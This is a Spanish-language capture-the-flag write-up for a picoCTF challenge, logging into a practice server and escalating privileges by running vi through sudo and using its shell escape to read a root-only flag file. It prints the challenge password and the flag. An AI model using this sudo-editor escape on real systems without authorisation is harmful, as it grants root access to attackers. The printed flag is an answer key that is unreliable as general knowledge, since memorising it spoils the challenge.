#notas_hacking #general_skills
# Reto
## Descripción
Can you read files in the root file?
Additional details will be available after launching your challenge instance.
The system admin has provisioned an account for you on the main server:`ssh -p 58407 picoplayer@saturn.picoctf.net`Password: `j4ks-9nxB-`Can you login and read the root file?
## Solución
```bash
SergioMXZ-picoctf@webshell:~$ ssh -p 63014 picoplayer@saturn.picoctf.net
...
picoplayer@challenge:~$ ls
picoplayer@challenge:~$ ls -al
total 12
drwxr-xr-x 1 picoplayer picoplayer   20 Sep 15 04:51 .
drwxr-xr-x 1 root       root         24 Aug  4  2023 ..
-rw-r--r-- 1 picoplayer picoplayer  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 picoplayer picoplayer 3771 Feb 25  2020 .bashrc
drwx------ 2 picoplayer picoplayer   34 Sep 15 04:51 .cache
-rw-r--r-- 1 picoplayer picoplayer  807 Feb 25  2020 .profile
picoplayer@challenge:~$ ls /
bin   challenge  etc   lib    lib64   media  opt   root  sbin  sys  usr
boot  dev        home  lib32  libx32  mnt    proc  run   srv   tmp  var
picoplayer@challenge:~$ ls /root
ls: cannot open directory '/root': Permission denied
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:~$ sudo vi

picoCTF{uS1ng_v1m_3dit0r_021d10ab}
```
nos conectamos y parece ser que es una maquina de corre ubuntu, después de un ls nos damos cuenta que no hay archivos y los ocultos no parecen tener nada interesante, como dice el problema, mostramos que hay en /, y parece que no podemos acceder a nada, entonces vemos los permisos que tenemos, y solo se puede usar vi, que es un editor de texto, entonces entramos a vi pero como sudo, y dentro escribimos :! ls -la /root, con lo que que nos aparece un archivo oculto llamado .flag.txt, volvemos a vi y ejecutamos ahora :! cat /root/.flag.txt
## Notas
sudo -l - te muestra los permisos que tienes
sudo vi - ejecuta vi como super usuario
vi - vim editor de texto
## Referencias
